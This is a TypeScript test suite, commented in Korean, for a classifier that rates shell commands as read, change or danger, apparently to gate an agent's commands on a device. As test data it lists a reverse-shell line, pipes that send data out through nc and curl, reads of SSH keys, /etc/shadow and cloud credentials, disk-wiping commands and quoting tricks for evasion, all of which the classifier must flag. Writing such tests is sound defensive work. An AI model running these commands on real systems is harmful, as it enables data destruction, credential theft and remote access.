import assert from 'node:assert/strict'
import { test } from 'node:test'
import { analyze, destroysBlockedPath, effectiveRisk, REASON_TEXT, type Reason, type Risk } from './risk.mts'

const risk = (c: string): Risk => analyze(c).risk
let total = 0
const expect = (want: Risk | 'notread', cmds: string[]) => {
  for (const c of cmds) {
    total++
    const r = risk(c)
    if (want === 'notread') assert.notEqual(r, 'read', `읽기로 잘못 증명됨: ${JSON.stringify(c)}`)
    else assert.equal(r, want, `${JSON.stringify(c)} → ${r} ${analyze(c).reasons}`)
  }
}

test('읽기로 증명되는 명령', () => {
  expect('read', [
    'ls', 'ls -la /var/log', 'cat /etc/os-release', 'head -n 20 /var/log/syslog', 'tail -n 50 /var/log/syslog', 'wc -l /etc/passwd',
    'df -hP -x tmpfs -x devtmpfs', 'du -xh --max-depth=1 ~ 2>/dev/null | sort -rh | head -15', 'free -m', 'uptime -p', 'date +%F', 'date -d @1700000000 +%F', 'date -u',
    'hostname', 'hostname -I', 'uname -a', 'nproc', 'id', 'whoami', 'lsblk', 'lsusb', 'lspci', 'lsmod', 'lscpu',
    'ip addr', 'ip -br addr show', 'ip route get 1.1.1.1', 'ip -j link show dev eth0', 'ss -tlnp', 'ps aux', 'ps -eo pid,comm | grep python', 'top -b -n1',
    'env', 'printenv HOME', 'echo hello', 'echo "target=$(systemctl get-default 2>/dev/null)"', 'echo "up=$(uptime -p)"', "printf '%s\\n' a b",
    'test -f /etc/hosts && echo yes', '[ -d /tmp ] && echo dir', "find /var/log -name '*.log' -type f", 'find . -maxdepth 2 -name x -newer y',
    'stat /etc/hosts', 'file /bin/ls', 'readlink -f /bin/sh', 'realpath .', 'basename /a/b', 'dirname /a/b',
    'journalctl -u ssh -n 100 --no-pager', 'journalctl -p err -n 50', 'journalctl --disk-usage', 'journalctl --disk-usage 2>&1',
    'systemctl status ssh', 'systemctl is-active docker', 'systemctl list-units --type=service --no-pager', 'systemctl get-default', 'systemctl list-timers --all', 'systemctl cat ssh',
    'apt list --upgradable 2>/dev/null', 'apt-cache policy nvidia-jetpack', 'dpkg -l | grep ros', 'dpkg -s curl', 'dpkg -L bash',
    "apt-get -s upgrade 2>&1 | grep -E '^(Inst|Remv|Conf)' | head -200", 'apt-get -s autoremove 2>&1 | grep -E "^Remv" | head -100',
    'nvpmodel -q', 'jetson_clocks --show', 'i2cdetect -l', 'v4l2-ctl --list-devices', 'v4l2-ctl -d /dev/video0 --list-formats-ext',
    'ros2 topic list', 'ros2 node list', 'ros2 pkg list', 'ros2 interface list', 'ros2 doctor --report', 'ros2 param get /my_node use_sim_time',
    'git status', 'git -C ~/proj log --oneline -n 5', 'git diff --stat', 'git branch -a', 'dmesg | tail -n 20',
    "awk '{print $1}' /proc/loadavg", "awk -F: '{print $1}' /etc/passwd", "sed -n '1,5p' /etc/hosts", "sed 's/foo/bar/g' /etc/hosts", "sed -n '/error/p' /var/log/syslog",
    "grep -E 'a|b' /var/log/syslog", 'grep -rn TODO ~/proj', 'cut -d: -f1 /etc/passwd', 'sort -u /etc/hosts', 'sort -rh', 'uniq -c', 'tr a-z A-Z',
    'cat /proc/cpuinfo', 'cat /sys/class/thermal/thermal_zone0/temp', 'ls /dev/video*', 'ls /dev/ttyUSB* /dev/ttyACM* 2>/dev/null', 'lsusb | head -n 3',
    'ls $HOME', '/bin/ls', '/usr/bin/ls -l', 'ls 2>&1', 'ls > /dev/null', 'ls &>/dev/null', 'echo x >&2', 'ls 3>&1', 'ls --', 'ls ""',
    'ls ；rm x' // 전각 세미콜론은 구분자가 아니라 그냥 글자 (bash도 같음)
  ])
})

test('우회 시도: 따옴표·이스케이프로 명령 이름 숨기기', () => {
  expect('danger', ["r''m x", 'r""m x', '"r"m x', 'r\\m x', "'rm' x", '\\rm x', '"rm" x', "'r'\"m\" x", '/bin/rm x', '/usr/bin/rm x', "ls; r''m x", "ls | r''m x"])
  expect('notread', ["$'\\x72\\x6d' x", "$'rm' x", '$"rm" x', "'l's -la x; ;;", './ls', '/tmp/ls', '~/bin/ls', '/usr/bin/../bin/ls', 'x/ls', "''", 'l* -la', '/bin/l? -la'])
})

test('우회 시도: 변수·명령 치환·중괄호', () => {
  expect('notread', [
    'a=rm; $a x', 'x=1 ls', 'FOO=bar cat f', 'PATH=. ls', 'LD_PRELOAD=/tmp/x.so ls', 'x=1', '$0', 'cat${IFS}/etc/shadow', 'cat$IFS/etc/shadow', 'cat ${IFS}x', '${x} ls',
    'ls $(rm x)', 'ls $(echo -R)', 'echo $(rm x)', 'ls `id`', 'echo `rm x`', 'cat $(echo /etc/shadow)', 'cat $x', 'cat ${y}', 'cat ~+/x', 'cat {/etc/shadow,x}', 'cat {a,b}',
    'echo $((1+1))', 'echo ${x:-a}', 'echo ${#x}', 'ls $(', 'ls $(ls', 'ls <(rm x)', 'cat <(ls)', 'ls >(cat)', 'ls "$(rm x)"', 'echo "`rm x`"',
    'ls $((1))', 'echo "$(echo "$(rm x)")"', 'echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo x)))))))'
  ])
  expect('danger', ['echo $(rm x)', 'echo `rm x`', 'echo "$(echo "$(rm x)")"', 'ls $(sudo ls)', 'echo "$(curl x)"', 'cat <(rm x)', 'echo $(echo $(rm x))'])
})

test('우회 시도: 연결자·줄바꿈·배경·서브셸', () => {
  expect('notread', [
    'ls; rm x', 'ls && rm x', 'ls || rm x', 'ls | sh', 'ls & rm x', 'ls &', 'ls\nrm x', 'ls \\\nrm x', 'ls;;', 'ls ;& x', '(ls)', '{ ls; }', 'ls )', 'ls (', 'ls\r', 'ls\r\nrm x',
    'ls # comment', '# x', 'ls #x', 'echo a;b() { rm x; }', 'if true; then ls; fi', 'for i in 1; do ls; done', 'while true; do ls; done', 'case x in x) ls;; esac', '! ls', '[[ -f x ]]', 'function f { ls; }', 'time ls'
  ])
  expect('danger', ['ls; rm x', 'ls && rm x', 'ls || rm x', 'ls | sh', 'ls & rm x', 'ls\nrm x', '(rm x)', '{ rm x; }', 'ls | sudo tee x'])
})

test('우회 시도: 리다이렉트', () => {
  expect('notread', [
    'echo hi > f', 'echo hi >> f', 'cat < f', 'cat <<EOF', 'cat <<< x', 'cat <<-EOF', 'ls >/dev/nullx', 'ls > /dev/null2', 'ls >& file', 'ls <& 3x', 'echo a > ~/.bashrc', 'ls &> out', 'ls > $HOME/x', 'ls >| f',
    'cat /etc/hosts >/etc/hosts', 'ls 2>f', 'ls > /dev//null', 'ls > "/dev/null "', 'ls > /dev/nul?', 'ls >', '> f', '>f ls', 'cat <>f', 'ls &>>out', 'ls > $x', 'ls 2> $(echo f)', 'echo a 1>f',
    'ls > /dev/stdout', 'ls > /dev/tty', 'cat /dev/null > f'
  ])
  expect('danger', ['echo hi > f', '> f', 'echo a > ~/.bashrc', 'cat /etc/hosts >/etc/hosts', 'ls >& file', 'echo x > /etc/foo', 'echo x >> /etc/foo', 'ls > ~/.ssh/authorized_keys'])
})

test('우회 시도: 민감한 파일 (경로 숨기기·글롭·옵션 값)', () => {
  expect('danger', [
    'cat ~/.ssh/id_rsa', 'cat /etc/shadow', 'cat /etc//shadow', 'cat /etc/./shadow', 'cat /etc/x/../shadow', 'cat /etc/sh""adow', 'cat /etc/sh\\adow', "cat '/etc/shadow'", 'cat /etc/shad*', 'cat /e*/shadow',
    'cat /etc/s[h]adow', 'cat /???/shadow', 'cat ~/.ss?/id_rsa', 'cat ~/.[s]sh/id_rsa', 'ls ~/.ssh', 'cat .env', 'cat ~/.aws/credentials', 'cat ~/.netrc', 'cat ~/.git-credentials', 'cat server.pem',
    'cat some.key', 'cat /root/x', 'cat ~root/x', 'cat /proc/self/environ', 'cat /proc/1/environ', 'cat /proc/$$/environ', 'cat /dev/mem', 'head -c 100 /dev/sda', 'cat /dev/mmcblk0p1',
    'grep -r password ~', 'grep -r token', 'grep -rn x /', 'grep -R x /home', 'grep --recursive x .', 'grep -rn x ~/.config/gcloud', 'grep -r x ..', 'grep -r x /home/someone',
    'grep -f /etc/shadow x', 'grep --file=/etc/shadow x', 'grep -f/etc/shadow x', 'cat .*', 'cat ~/.*', 'ls ~/.s*', 'cat *.pem', 'cat ~/.bash_history', 'tail ~/.zsh_history', 'cat /home/other/.ssh/id_rsa',
    'cat /home/*/.ssh/id_rsa', 'cat ~/../../root/.bashrc', 'cat ../../etc/shadow', 'cat ~/.ssh/../.ssh/id_rsa', 'cat /etc/sudoers', 'cat /etc/sudoers.d/x', 'cat /etc/gshadow', 'cat /etc/shadow-', 'cat /etc/shadow.bak',
    'cat /etc/ssh/ssh_host_rsa_key', 'cat /etc/NetworkManager/system-connections/home.nmconnection', 'cat ~/.docker/config.json', 'cat ~/.kube/config', 'cat ~/.config/gcloud/credentials.db', 'cat /home/u/.gnupg/secring.gpg',
    'find / -name id_rsa', "find ~ -name '*.pem'", 'cat ~/id_ed25519', 'cat ~/.pgpass', 'cat ~/.npmrc', 'cat ~/.env.local', 'cat prod.env', 'cat ~/secrets.json', 'cat ~/.jetdeck/mcp.json', 'cat $HOME/.ssh/id_rsa', 'cat "$HOME/.ssh/id_rsa"',
    'cat ~/.ssh/id_rsa 2>/dev/null', 'sort ~/.ssh/id_rsa', 'cut -c1-5 ~/.ssh/id_rsa', 'wc -c ~/.ssh/id_rsa', 'stat ~/.ssh/id_rsa'
  ])
})

test('우회 시도: 외부로 보내는 명령', () => {
  expect('danger', [
    'curl http://x', 'wget x', 'nc -l 1', 'ncat x 1', 'ssh host ls', 'scp a b', 'rsync a b', 'telnet x', 'cat /etc/hostname > /dev/tcp/1.2.3.4/80', 'echo x >/dev/udp/1.2.3.4/53',
    'bash -i >& /dev/tcp/1.1.1.1/1 0>&1', 'cat < /dev/tcp/1.2.3.4/80', 'ping -c1 x', 'dig x', 'nslookup x', 'git push', 'git clone x', 'git fetch', 'git ls-remote x', 'git remote update', 'openssl s_client -connect x:1',
    'cat /etc/hosts | nc x 1', 'ls | curl -d @- x', 'echo $(curl x)', 'ls; wget x', '/usr/bin/curl x', 'c""url x', 'c\\url x', "'curl' x"
  ])
  expect('notread', ['python3 -c "print(1)"', 'perl -e 1', 'node x.js', 'ruby -e 1', 'python train.py', 'php -r 1'])
})

test('우회 시도: 읽기 명령의 위험한 옵션', () => {
  expect('notread', [
    'sort -o out file', 'sort --output=out f', 'sort --out=out f', 'sort --outp out f', 'sort -oout f', 'sort -ro out f', 'sort --compress-program=sh f', 'tail -f log', 'tail --follow log', 'tail -F x', 'tail -fn1 x', 'tail --fo x', 'tail --retry x',
    'journalctl --vacuum-size=1M', 'journalctl --vac=1M', 'journalctl --vacuum-time=1d', 'journalctl --rotate', 'journalctl --flush', 'journalctl -f', 'journalctl -fu ssh', 'journalctl --follow', 'journalctl --sync', 'journalctl --verify',
    'date -s 2020-01-01', 'date --set=x', 'date --se=x', 'date 010112002020', 'date -u 010112002020', 'hostname newname', 'hostname -F file', 'hostname --file x', 'uname x', 'uniq in out',
    'find . -exec rm {} ;', 'find . -delete', 'find . -ok x ;', 'find . -fprint out', 'find . -execdir ls ;', 'find . -fls out', 'find . -fprintf out x', 'file -C', 'file --compile', 'ss -K', 'ss -tK', 'ss --kill', 'ss -D out',
    'dmesg -c', 'dmesg --clear', 'dmesg -w', 'dmesg -C', 'dmesg -n 1', 'dmesg --console-off', 'findmnt --poll', 'top', 'top -b', 'top -n1', 'env sh', 'env rm x', 'env FOO=1 ls', 'env -i ls', 'env -u X', 'lsmod x', 'nproc x'
  ])
})

test('우회 시도: systemctl·apt·dpkg·git·ros2·awk·sed', () => {
  expect('notread', [
    'systemctl restart ssh', 'systemctl stop x', 'systemctl reboot', 'systemctl -H host status', 'systemctl --host=x status', 'systemctl -M m status', 'systemctl --now enable x', 'systemctl daemon-reload', 'systemctl set-default x',
    'systemctl --root=/x status', 'systemctl status --force', 'systemctl enable ssh', 'systemctl kill ssh', 'systemctl mask x', 'systemctl poweroff', 'systemctl isolate rescue.target',
    'apt-get update', 'apt-get -y upgrade', 'apt-get install x', 'apt-get -s -o APT::Update::Pre-Invoke::=sh install x', 'apt-get -s --option=x=y install x', 'apt-get -s download x', 'apt-get clean', 'apt install x', 'apt update', 'apt remove x',
    'apt list -o x=y', 'apt-cache gencaches', 'apt-cache -o Dir=x policy', 'dpkg -i x.deb', 'dpkg -r x', 'dpkg --purge x', 'dpkg --configure -a', 'dpkg -l --set-selections', 'dpkg-reconfigure x',
    'nvpmodel -m 0', 'nvpmodel', 'jetson_clocks', 'jetson_clocks --store', 'jetson_clocks --restore', 'i2cdetect -y 1', 'i2cdetect', 'v4l2-ctl --set-ctrl=x=1', 'v4l2-ctl --stream-mmap', 'v4l2-ctl -c x=1',
    'ros2 run a b', 'ros2 launch a b', 'ros2 topic echo /x', 'ros2 topic pub x', 'ros2 topic hz /x', 'ros2 param set /a b c', 'ros2 param dump /n --output-dir x', 'ros2 bag record -a', 'ros2 doctor --foo', 'ros2',
    'git commit -m x', 'git checkout x', 'git reset --hard', 'git diff --output=f', 'git diff --output f', 'git -c core.pager=sh log', 'git branch newbranch', 'git branch -D x', 'git config --global x y', 'git log --ext-diff', 'git --exec-path=x status', 'git stash', 'git tag v1', 'git add .', 'git pull',
    '/usr/bin/git status', '/usr/local/bin/git log', '/bin/git diff', './git status', 'git log --ext-d', 'git diff --textc', 'git status --ignore-submodules=none', 'git status --ignore-sub=none', 'git log --recurse-submodules', 'git log --show-signature', 'git log --submodule=diff', 'git diff --textconv',
    "awk 'BEGIN{system(\"rm x\")}'", "awk '{print > \"f\"}'", "awk '{print | \"sh\"}'", 'awk -f prog.awk x', "awk 'BEGIN{\"id\" | getline x}'", "awk '{print}' x; awk -i inplace x", "awk -e 'BEGIN{}' x", 'awk',
    'sed -i s/a/b/ f', "sed -n 'w out' f", "sed 's/a/b/w out' f", "sed 'e' f", 'sed -f scr f', "sed '1e id' f", "sed 's/a/b/e' f", 'sed --in-place x f', "sed -i.bak 's/a/b/' f", "sed 's/a/b/;w out' f", "sed 'r /etc/shadow' f", 'sed'
  ])
  expect('danger', ['systemctl reboot', 'systemctl poweroff', 'apt-get -y upgrade', 'apt install x', 'apt remove x', 'dpkg -i x.deb', 'dpkg -r x', 'git push', 'apt-get install x', 'apt-get -y autoremove', 'apt autoremove'])
})

test('우회 시도: 다른 프로그램을 실행시키는 말·알 수 없는 명령', () => {
  expect('notread', [
    'xargs rm', 'ls | xargs rm', 'eval ls', 'bash -c ls', "sh -c 'ls'", 'exec ls', '. ./x', 'source x', 'sudo ls', 'su', 'nohup ls', 'timeout 5 ls', 'time ls', 'command ls', 'nice ls', 'watch ls', 'tee f', 'mv a b', 'cp a b',
    'touch x', 'mkdir x', 'chmod 777 x', 'ln -s a b', 'kill 1', 'pkill x', 'docker run x', 'systemd-run ls', 'busybox ls', 'ｒｍ x', 'lss', 'ls2', 'builtin ls', 'sleep 1', 'yes', 'tegrastats', 'script', 'setsid ls', 'stdbuf ls', 'flock x ls', 'ionice ls'
  ])
  expect('danger', ['bash -c ls', "sh -c 'ls'", 'eval ls', 'exec ls', 'source x', '. ./x', 'sudo ls', 'su', 'ls | bash', 'xargs rm', 'ls | xargs rm', 'nohup rm x', 'timeout 5 rm x', 'env bash', 'nice rm -rf x', 'busybox ls'])
  expect('danger', ['rm x', 'rm -rf /', 'dd if=a of=b', 'mkfs.ext4 x', 'mkfs x', 'reboot', 'shutdown now', 'poweroff', 'halt', 'shred x', 'mount /dev/x /mnt', 'umount x', 'fdisk /dev/sda', 'crontab -e', 'passwd', 'useradd x', 'iptables -F', 'modprobe x', 'pip install x', 'pip3 uninstall x', 'npm install x', 'snap install x', 'wipefs -a x'])
  expect('change', ['shutdown -c', 'mv a b', 'cp a b', 'touch x', 'kill 1', 'python3 x.py', 'systemctl restart ssh', 'apt-get update', 'journalctl --vacuum-size=1M', 'systemctl set-default graphical.target', 'git commit -m x'])
})

test('이유 코드는 모두 앱 글자가 있고, 위험 이유가 맞게 붙는다', () => {
  for (const [c, why] of [['rm x', 'delete'], ['curl x', 'network'], ['sudo ls', 'privilege'], ['bash -c x', 'shell'], ['cat ~/.ssh/id_rsa', 'sensitive'], ['reboot', 'power'], ['apt install x', 'package'], ['foo', 'unknown'], ['ls $x', 'dynamic'], ['sort -o f', 'unsafe'], ['ls\nls', 'newline'], ['ls &', 'background'], ['x=1 ls', 'assign']] as [string, Reason][]) {
    total++
    assert.ok(analyze(c).reasons.includes(why), `${c}: ${analyze(c).reasons}`)
  }
  for (const k of Object.keys(REASON_TEXT)) assert.ok(REASON_TEXT[k as Reason], k)
})

test('실질 위험도 = max(선언, 계산), 내려갈 수 없다', () => {
  assert.deepEqual(effectiveRisk('read', 'ls').risk, 'read')
  assert.deepEqual(effectiveRisk('read', 'rm x'), { risk: 'danger', computed: 'danger', understated: true, reasons: ['delete'] })
  assert.equal(effectiveRisk('read', 'foo').risk, 'change')
  assert.equal(effectiveRisk('read', 'foo').understated, true)
  assert.equal(effectiveRisk('danger', 'ls').risk, 'danger') // 선언이 높으면 그대로
  assert.equal(effectiveRisk('danger', 'ls').understated, false)
  assert.equal(effectiveRisk('change', 'ls').risk, 'change')
  assert.equal(effectiveRisk('read', 'ls', { sudo: true }).risk, 'change')
  assert.equal(effectiveRisk('change', 'apt-get update', { sudo: true }).understated, false)
  assert.equal(effectiveRisk('change', 'shutdown -r +5', { sudo: true }).risk, 'danger')
})

test('막힌 경로를 지우는 명령', () => {
  for (const c of ['rm -rf /', 'rm -rf /etc', 'rm -r /usr/lib/x', 'rm -rf ~', 'rm -rf /var', 'rm -rf /opt/nvidia/x', 'dd if=/dev/zero of=/dev/sda', 'rm -rf /*', 'rm -rf ~/*', 'rm -rf $HOME', 'rm -rf $X', 'rm -rf "/"', 'rm -rf //', 'rm -rf /./etc', 'rm -rf /etc/', 'find /var -delete', 'rm -rf /home', 'rm -rf *', 'rm -rf .', "rm -rf '/'", 'rm -rf /e""tc', 'rm -rf /etc/../etc', 'shred /dev/sda', 'rmdir /usr', 'truncate -s 0 /etc/passwd', 'ls; rm -rf /', 'echo $(rm -rf /)', 'rm -rf ${HOME}']) {
    total++
    assert.ok(destroysBlockedPath(c), c)
  }
  for (const c of ['rm -rf /var/cache/apt/archives/partial', 'ls /', 'rm ~/x', 'rm -rf ./build', 'dd if=a of=b', 'apt-get clean', 'rm -rf /home/u/x', 'find ~/x -delete', 'rm -rf ~/build/*', 'journalctl --vacuum-size=200M']) {
    total++
    assert.equal(destroysBlockedPath(c), null, c)
  }
})

test('아무 글자나 넣어도 멈추거나 던지지 않고, 읽기 증명은 알려진 모양에서만', () => {
  const chars = [...`ab ls cat rm /\\'"$()\`{}[]<>|&;*?~#!=-.,:\n\t​\u0000é한`]
  let seed = 12345
  const rnd = (n: number) => ((seed = (seed * 1103515245 + 12345) & 0x7fffffff), seed % n)
  const t0 = Date.now()
  for (let k = 0; k < 3000; k++) {
    let s = ''
    for (let j = rnd(40); j > 0; j--) s += chars[rnd(chars.length)]
    const r = analyze(s)
    assert.ok(['read', 'change', 'danger'].includes(r.risk), s)
    destroysBlockedPath(s)
  }
  assert.ok(Date.now() - t0 < 5000)
  const big = analyze('echo ' + '$('.repeat(500) + 'x' + ')'.repeat(500)) // 너무 깊은 중첩은 읽기가 아님
  assert.notEqual(big.risk, 'read')
  assert.notEqual(analyze('ls ' + 'a'.repeat(9000)).risk, 'read') // 너무 긴 명령
  assert.notEqual(analyze(Array(300).fill('ls').join(';')).risk, 'read') // 명령이 너무 많음
})

test('시험 개수: 우회 시도 150건 이상', () => {
  assert.ok(total >= 150, String(total))
})
